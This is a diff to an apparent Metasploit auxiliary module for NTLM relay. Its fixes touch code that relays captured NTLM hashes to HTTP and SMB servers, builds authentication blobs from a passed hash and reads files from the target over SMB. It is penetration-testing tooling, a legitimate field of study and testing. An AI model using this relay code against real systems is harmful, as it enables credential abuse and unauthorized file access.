@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
 
 					Complicated custom attacks requiring multiple requests that depend on each
 					other can be written using the SYNC* options. For example, a typical CSRF
-					typical CSRF style attack might look like:
+					style attack might look like:
 
 					1)	Set an HTTP_GET request with a unique SNYNCID
 					2)	Set an HTTP_POST request with a SYNCFILE, which contains logic to look
@@ -255,29 +255,25 @@ class Metasploit3 < Msf::Auxiliary
 		type3 = (ser_sock == nil ? false : true)
 
 		method = datastore['RTYPE'].split('_')[1]
-		theaders = {'Authorization' => "NTLM " << hash,
-					'Connection' => 'Keep-Alive' }
+		theaders = ('Authorization: NTLM ' << hash << "\r\n" <<
+					"Connection: Keep-Alive\r\n" )
 
 		if (method == 'POST')
-			theaders['Content-Length'] = (datastore['FINALPUTDATA'].length + 4).to_s()
+			theaders << 'Content-Length: ' + (datastore['FINALPUTDATA'].length + 4).to_s()<< "\r\n"
 		end
 
-		# HTTP_HEADERFILE is how thie module supports cookies, multipart forms, etc
+		# HTTP_HEADERFILE is how this module supports cookies, multipart forms, etc
 		if datastore['HTTP_HEADERFILE'] != nil
-			print_status("Including extra headers from: #{datastore['SYNCFILE']}")
+			print_status("Including extra headers from: #{datastore['HTTP_HEADERFILE']}")
 			#previous request might create the file, so error thrown at runtime
 			if not ::File.readable?(datastore['HTTP_HEADERFILE'])
-				print_error("SYNCFILE unreadable, aborting")
+				print_error("HTTP_HEADERFILE unreadable, aborting")
 				raise ArgumentError
 			end
-			begin
-				File.readlines(datastore['HTTP_HEADERFILE']).each do|header|
-					h = header.split(":")
-					theaders[h[0].strip] = h[1].strip
-				end
-			rescue ::Exception => e
-				print_error("HTTP_HEADERFILE not parsed correctly")
-				raise e
+			#read file line by line to deal with any dos/unix ending ambiguity
+			File.readlines(datastore['HTTP_HEADERFILE']).each do|header|
+				next if header.strip == ''
+				theaders << (header) << "\r\n"
 			end
 		end
 
@@ -285,12 +281,14 @@ class Metasploit3 < Msf::Auxiliary
 		'uri'     => datastore['RURIPATH'],
 		'method'  => method,
 		'version' => '1.1',
-		'headers' => theaders,
 		}
 		if (datastore['FINALPUTDATA'] != nil)
+			#we need to get rid of an extra "\r\n"
+			theaders = theaders[0..-3]
 			opts['data'] = datastore['FINALPUTDATA'] << "\r\n\r\n"
 		end
 		opts['SSL'] = true if datastore["RSSL"]
+		opts['raw_headers'] = theaders
 
 		ser_sock = connect(opts) if !type3
 
@@ -305,10 +303,7 @@ class Metasploit3 < Msf::Auxiliary
 			else
 				print_status("Auth successful, saving server response in database")
 			end
-			#if verbose, print the response
-			if datastore['VERBOSE']
-				print_status(resp)
-			end
+			vprint_status(resp)
 		end
 		return [resp, ser_sock]
 	end
@@ -338,7 +333,8 @@ class Metasploit3 < Msf::Auxiliary
 		blob = Rex::Proto::NTLM::Utils.make_ntlmssp_secblob_init('', '', 0x80201)
 		ser_sock.client.negotiate(true)
 		ser_sock.client.require_signing = false
-		resp = ser_sock.client.session_setup_with_ntlmssp_blob(blob)
+		resp = ser_sock.client.session_setup_with_ntlmssp_blob(blob, false)
+		resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
 
 		#Save the user_ID for future requests
 		ser_sock.client.auth_user_id = resp['Payload']['SMB'].v['UserID']
@@ -361,6 +357,7 @@ class Metasploit3 < Msf::Auxiliary
 		arg = get_hash_info(hash)
 		dhash = Rex::Text.decode_base64(hash)
 
+		#Create a GSS blob for ntlmssp type 3 message, encoding the passed hash
 		blob =
 			"\xa1" + Rex::Proto::NTLM::Utils.asn1encode(
 				"\x30" + Rex::Proto::NTLM::Utils.asn1encode(
@@ -374,9 +371,10 @@ class Metasploit3 < Msf::Auxiliary
 
 		resp = ser_sock.client.session_setup_with_ntlmssp_blob(
 				blob,
-				true,
+				false,
 				ser_sock.client.auth_user_id
 			)
+		resp = ser_sock.client.smb_recv_parse(CONST::SMB_COM_SESSION_SETUP_ANDX, true)
 
 		#check if auth was successful
 		if (resp['Payload']['SMB'].v['ErrorClass'] == 0)
@@ -399,11 +397,9 @@ class Metasploit3 < Msf::Auxiliary
 		ser_sock.client.open("\\" << path, 0x1)
 		resp = ser_sock.client.read()
 		print_status("Reading #{resp['Payload'].v['ByteCount']} bytes from #{datastore['RHOST']}")
-		if datastore["VERBOSE"]
-			print_status("----Contents----")
-			print_status(resp["Payload"].v["Payload"])
-			print_status("----End Contents----")
-		end
+		vprint_status("----Contents----")
+		vprint_status(resp["Payload"].v["Payload"])
+		vprint_status("----End Contents----")
 		ser_sock.client.close()
 		return resp["Payload"].v["Payload"]
 	end
@@ -661,8 +657,9 @@ class Metasploit3 < Msf::Auxiliary
 
 				type = datastore['RESPPAGE'].split('.')[-1].downcase
 				#images can be especially useful (e.g. in email signatures)
-				if type == 'png' or type == 'gif' or type == 'jpg' or type == 'jpeg'
-					print_status('setting header')
+				case type
+				when 'png', 'gif', 'jpg', 'jpeg'
+					print_status('setting content type to image')
 					response.headers['Content-Type'] = "image/" << type
 				end
 			rescue
